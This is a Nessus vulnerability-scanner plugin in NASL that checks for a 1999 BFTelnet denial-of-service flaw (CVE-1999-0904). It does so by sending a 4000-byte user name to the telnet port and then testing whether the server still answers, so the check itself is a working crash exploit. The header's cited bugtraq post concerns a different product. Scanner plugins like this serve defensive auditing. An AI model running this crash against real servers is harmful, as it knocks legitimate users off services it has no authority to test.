#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# See also:
# Subject: IBM Infoprint Remote Management Simple DoS 
# Date: Fri, 25 Oct 2002 12:19:23 +0300
# From: "Toni Lassila" <toni.lassila@mc-europe.com>
# To: bugtraq@securityfocus.com
#

if(description)
{
 script_id(10026);
 script_bugtraq_id(771);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-1999-0904");
 name["english"] = "BFTelnet DoS";
 name["francais"]= "Déni de service contre BFTelnet";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to make the remote telnet server crash
by sending a too long user name.

An attacker may use this flaw to prevent legitimate
users from using this service.


Solution : Contact your vendor for a patch or do not use this service
Risk factor : Medium";

 desc["francais"] = "
Il s'est avéré possible de faire planter le serveur
telnet distant en lui donnant un nom d'utilisateur
trop long.

Un pirate peut utiliser ce problème pour empecher les
utilisateurs légitimes d'utiliser ce service.

Solution : contactez votre vendeur pour un patch ou
           n'utilisez pas ce service
	   
Facteur de risque : Moyen";
	 
 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "crashes the remote telnet server";
 summary["francais"] = "fait planter le serveur telnet distant";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], 
 	       francais:family["francais"]);
 script_require_ports("Services/telnet", 23);
 script_dependencies("find_service.nes");
 exit(0);
}

#
# The script code starts here
#

include('telnet_func.inc');

port = get_kb_item("Services/telnet");
if(!port)port = 23;
if (get_port_state(port))
{
 soc = open_sock_tcp(port);

 if (soc)
 {
   banner = telnet_negotiate(socket:soc);
   data = string(crap(4000), "\r\n");
   send(socket:soc, data:data);
   close(soc);
   
   soc2 = open_sock_tcp(port);
   if(!soc2)security_warning(port);
 }
}
